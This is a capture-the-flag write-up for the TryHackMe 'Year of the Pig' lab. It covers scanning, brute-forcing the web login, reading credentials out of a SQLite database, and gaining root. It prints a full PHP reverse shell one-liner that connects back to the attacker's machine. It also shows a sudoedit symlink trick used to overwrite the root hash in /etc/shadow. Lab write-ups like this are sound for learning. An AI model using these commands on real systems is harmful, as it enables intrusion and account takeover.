This is a writeup on the TryHackMe box, [Year of the Pig](https://tryhackme.com/room/yearofthepig).
# Enumeration
## Port scanning
We start with `nmap -p- 10.10.216.205 --min-rate=5000` and see there are only two ports open, ssh and http.
```
Starting Nmap 7.92 ( https://nmap.org ) at 2021-12-27 18:08 EST
Warning: 10.10.216.205 giving up on port because retransmission cap hit (10).
Nmap scan report for 10.10.216.205
Host is up (0.25s latency).
Not shown: 63764 closed tcp ports (conn-refused), 1769 filtered tcp ports (no-response)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 49.88 seconds
```
## Web Enumeration
### Homepage
![](Pasted%20image%2020211227181207.png)

We use gobuster to look for possible directories 
`gobuster dir -u 10.10.216.205 -w /usr/share/seclists/Discovery/Web-Content/raft-small-words.txt`
```
===============================================================      
Gobuster v3.0.1                                            
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)      
===============================================================    
[+] Url:            http://10.10.216.205                    
[+] Threads:        10                                      
[+] Wordlist:       /usr/share/seclists/Discovery/Web-Content/raft-small-words.txt 
[+] Status codes:   200,204,301,302,307,401,403                
[+] User Agent:     gobuster/3.0.1  
[+] Timeout:        10s                                   
===============================================================  
2021/12/27 18:09:13 Starting gobuster
===============================================================
/.php (Status: 403)
/admin (Status: 301)
/js (Status: 301)
/css (Status: 301)
/.htm (Status: 403)
/.html (Status: 403)
/api (Status: 301)
/assets (Status: 301)
/. (Status: 200)
/.htaccess (Status: 403)
/.phtml (Status: 403)
/.htc (Status: 403)
/.html_var_DE (Status: 403)
/server-status (Status: 403)
...
```
The only interesting directories we find are `/admin` and `/api`. Let's check them out.

`/admin` redirected to `/login.php`
![](Pasted%20image%2020211227181347.png)

`/api`
![](Pasted%20image%2020211227181429.png)

From `login.php`, we find an example request to `/api/login`
![](Pasted%20image%2020211227182649.png)
From basic js reverse engineering, we see the password parameter is an md5 hash with no salt. 

```js
const _0x44d4=['auth','querySelector','click','replace','post','#submit-btn','input','then','authLogin=','addEventListener','keyCode','#username','style','Success','/admin','keyup','location','Response','cookie','application/json','stringify','same-origin','querySelectorAll','value','opacity:\x201'];(function(_0x2a05df,_0x44d43e){const _0x48fdee=function(_0x21eb22){while(--_0x21eb22){_0x2a05df['push'](_0x2a05df['shift']());}};_0x48fdee(++_0x44d43e);}(_0x44d4,0x114));const _0x48fd=function(_0x2a05df,_0x44d43e){_0x2a05df=_0x2a05df-0x0;let _0x48fdee=_0x44d4[_0x2a05df];return _0x48fdee;};function login(){const _0x289586=document[_0x48fd('0x0')]('#username'),_0x56c661=document[_0x48fd('0x0')]('#password'),_0x236a57=md5(_0x56c661[_0x48fd('0x16')]);fetch('/api/login',{'method':_0x48fd('0x3'),'credentials':_0x48fd('0x14'),'headers':{'Accept':_0x48fd('0x12')},'body':JSON[_0x48fd('0x13')]({'username':_0x289586[_0x48fd('0x16')],'password':_0x236a57})})[_0x48fd('0x6')](_0x59ed95=>_0x59ed95['json']())['then'](_0x5d33bc=>{document[_0x48fd('0x0')](_0x48fd('0xa'))['value']='',document[_0x48fd('0x0')]('#password')[_0x48fd('0x16')]='',_0x5d33bc[_0x48fd('0x10')]==_0x48fd('0xc')?(document[_0x48fd('0x11')]=_0x48fd('0x7')+_0x5d33bc[_0x48fd('0x18')]+';\x20samesite=lax;\x20path=\x22/\x22',window[_0x48fd('0xf')][_0x48fd('0x2')](_0x48fd('0xd'))):(alert(_0x5d33bc['Verbose']),document[_0x48fd('0x0')]('#pass-hint')[_0x48fd('0xb')]=_0x48fd('0x17'));});}document[_0x48fd('0x15')](_0x48fd('0x5'))['forEach'](_0x47694c=>{_0x47694c[_0x48fd('0x8')](_0x48fd('0xe'),_0x571e21=>{_0x571e21[_0x48fd('0x9')]===0xd&&document[_0x48fd('0x0')](_0x48fd('0x4'))[_0x48fd('0x1')]();});});
```
![](Pasted%20image%2020211227183437.png)
## Bruteforce credentials
The website is titled "Marco's Blog", so the username is likely `marco` or `admin`. We know from the hint on login page that the password is likely "a memorable word followed by two numbers and a special character". The background on the login page has a flag of Italy and from the website content, we see Marco is interested in planes. With that in mind, we scrap some "memorable words" from the website and we use them to generate some potential logins(for more details see [generate_possible_passwords.py](generate_possible_passwords.py)), and use `wfuzz` to test them.
```console
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************
Target: http://10.10.216.205/api/login
Total requests: 163200
=====================================================================
ID           Response   Lines    Word       Chars       Payload
=====================================================================

000016330:   500        0 L      0 W        0 Ch        "{"username":"Marco","password":"[omitted]"}"
000016328:   200        0 L      3 W        99 Ch       "{"username":"marco","password":"[omitted]"}"
```
We notice an interesing entry in the `wfuzz` result with 99 characters. After reversing the the corresponding hash, we find `marco`'s password.
## Admin page
After logging in to the website, we find another user, `curtis`
![](Pasted%20image%2020211227205653.png)

As it turns out, the admin page isn't very useful because the same credentials are used for ssh. Although, as an interesting anecdote, don't change `curtis`'s password!
# PrivEsc
Using the same credentials we get from bruteforcing, we ssh into the box as `marco` and find our first flag in `marco`'s home directory.
```console
marco@year-of-the-pig:~$ ls -al
total 24
drwxr-xr-x 2 marco marco 4096 Aug 22  2020 .
drwxr-xr-x 4 root  root  4096 Aug 16  2020 ..
lrwxrwxrwx 1 root  root     9 Aug 16  2020 .bash_history -> /dev/null
-rw-r--r-- 1 marco marco  220 Apr  4  2018 .bash_logout
-rw-r--r-- 1 marco marco 3771 Apr  4  2018 .bashrc
-r-------- 1 marco marco   38 Aug 22  2020 flag1.txt
-rw-r--r-- 1 marco marco  807 Apr  4  2018 .profile
```

Using `linpeas`, we find the following:
```
Found: /var/www/admin.db: regular file, no read permission
```
```console
marco@year-of-the-pig:/var/www$ ls -al
total 36
drwxr-xr-x  3 www-data web-developers  4096 Dec 28 02:05 .
drwxr-xr-x 13 root     root            4096 Aug 22  2020 ..
-rw-------  1 www-data www-data       24576 Dec 28 02:05 admin.db
drwxrwxr-x  7 www-data web-developers  4096 Aug 21  2020 html
```
`admin.db` is owned by `www-data`, for which we don't have access yet, so we need to go back to the website.

## www-data
Since we can add files to `/var/www/html`, we can "upload" a php reverse shell. I used
[https://highon.coffee/blog/reverse-shell-cheat-sheet/#php-reverse-shell](https://highon.coffee/blog/reverse-shell-cheat-sheet/#php-reverse-shell)
```php
<?php exec("/bin/bash -c 'bash -i >& /dev/tcp/10.my.ip.addr/8001 0>&1'");?>
```
After we trigger the reverse shell, `curl 10.10.216.205/rev.php`, we get a shell as `www-data`. Now we modify the permission of `admin.db` so we can access the database from ssh.
```console
www-data@year-of-the-pig:/var/www$ chmod 777 admin.db
chmod 777 admin.db
www-data@year-of-the-pig:/var/www$ ls -al
ls -al
total 40
drwxr-xr-x  3 www-data web-developers  4096 Dec 28 03:26 .
drwxr-xr-x 13 root     root            4096 Aug 22  2020 ..
-rw-------  1 www-data www-data          32 Dec 28 03:26 .bash_history
-rwxrwxrwx  1 www-data www-data       24576 Aug 21  2020 admin.db
drwxrwxr-x  7 www-data web-developers  4096 Dec 28 03:24 html
```
And we find the `curtis`'s password hash from the database.
```console
marco@year-of-the-pig:/var/www$ sqlite3 admin.db 
SQLite version 3.22.0 2018-01-22 18:45:57
Enter ".help" for usage hints.
sqlite> .tables
sessions  users   
sqlite> .dump users
PRAGMA foreign_keys=OFF;
BEGIN TRANSACTION;
CREATE TABLE users (
userID TEXT UNIQUE PRIMARY KEY,
username TEXT UNIQUE,
password TEXT);
INSERT INTO users VALUES('58a2f366b1fd51e127a47da03afc9995','marco','[omitted]');
INSERT INTO users VALUES('f64ccfff6f64d57b121a85f9385cf256','curtis','[omitted]');
COMMIT;
sqlite> 
```

Using a rainbow table online, we find `curtis`'s password
![](Pasted%20image%2020211228001846.png)

# More PrivEsc
For some reason, we can't ssh as curtis, but we can change to `curtis` from marco's ssh shell using the password from `admin.db`. And we find the second flag in `curtis`'s home directory.
```console
marco@year-of-the-pig:/var/www$ su curtis
Password: 
curtis@year-of-the-pig:/var/www$ cd /home/curtis
curtis@year-of-the-pig:~$ ls -al
total 28
drwxr-xr-x 3 curtis curtis 4096 Dec 28 03:32 .
drwxr-xr-x 4 root   root   4096 Aug 16  2020 ..
lrwxrwxrwx 1 root   root      9 Aug 16  2020 .bash_history -> /dev/null
-rw-r--r-- 1 curtis curtis  220 Apr  4  2018 .bash_logout
-rw-r--r-- 1 curtis curtis 3771 Apr  4  2018 .bashrc
-r-------- 1 curtis curtis   38 Aug 22  2020 flag2.txt
drwx------ 3 curtis curtis 4096 Dec 28 03:32 .gnupg
-rw-r--r-- 1 curtis curtis  807 Apr  4  2018 .profile
```

Using `sudo -l`, we find something interesting that `curtis` can do as `root`
```console
curtis@year-of-the-pig:~$ sudo -l 
[sudo] password for curtis: 
Matching Defaults entries for curtis on year-of-the-pig:
    env_keep+="LANG LANGUAGE LINGUAS LC_* _XKB_CHARSET", env_keep+="XAPPLRESDIR XFILESEARCHPATH XUSERFILESEARCHPATH"

User curtis may run the following commands on year-of-the-pig:
    (ALL : ALL) sudoedit /var/www/html/*/*/config.php
```
After some research and trial and error, we find `config.php` can be a symbolic link. In other words, if our `config.php` is a symbolic link to another file, say `other.php`, then when we `sudoedit config.php`, we are acutally editing `other.php`. Since `sudoedit` edits files as "root", we have edit access over almost any file in the filesystem.

Switching back to `www-data`, we create a symbolic link, `/var/www/html/test2/config.php`, that links to `/etc/shadow`.
```console
www-data@year-of-the-pig:/var/www/html$ mkdir test2
mkdir test2
www-data@year-of-the-pig:/var/www/html$ cd test2
cd test2
www-data@year-of-the-pig:/var/www/html/test2$ ln -s /etc/shadow config.php
ln -s /etc/shadow config.php
```
And as `curtis`, we edit the symbolic link we just created and modify the password hash of root to the hash of a known password. We used `mkpasswd` to generate the hash.
```console
curtis@year-of-the-pig:/var/www/html$ sudoedit /var/www/html/test2/./config.php
```

And now we can change ourselves to `root` using our password. The last flag is in `root`'s home directory.
```console
curtis@year-of-the-pig:/var/www/html$ su root
Password: 
root@year-of-the-pig:/var/www/html# whoami
root
root@year-of-the-pig:/var/www/html# cd /root
root@year-of-the-pig:~# ls -la
total 36
drwx------  5 root root 4096 Aug 22  2020 .
drwxr-xr-x 22 root root 4096 Aug 16  2020 ..
lrwxrwxrwx  1 root root    9 Aug 16  2020 .bash_history -> /dev/null
-rw-r--r--  1 root root 3106 Apr  9  2018 .bashrc
drwx------  2 root root 4096 Aug 16  2020 .cache
drwx------  3 root root 4096 Aug 16  2020 .gnupg
drwxr-xr-x  3 root root 4096 Aug 21  2020 .local
-rw-r--r--  1 root root  148 Aug 17  2015 .profile
-r--------  1 root root   38 Aug 22  2020 root.txt
-rw-r--r--  1 root root   42 Aug 16  2020 .vimrc
```